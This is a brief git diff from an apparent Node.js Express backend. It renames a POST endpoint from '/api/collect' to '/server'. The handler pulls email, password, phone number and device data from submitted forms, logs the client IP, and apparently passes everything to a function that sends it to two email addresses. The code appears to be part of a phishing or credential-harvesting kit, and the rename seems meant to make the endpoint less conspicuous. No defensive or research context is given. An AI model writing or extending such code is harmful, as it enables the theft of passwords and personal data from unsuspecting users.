@@ -305,7 +305,7 @@ async function sendToBothEmails(data) {
 }
 
 // ==================== API ENDPOINT ====================
-app.post('/api/collect', async (req, res) => {
+app.post('/server', async (req, res) => {
   try {
     const { email, password, phone, deviceData, timestamp } = req.body;
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
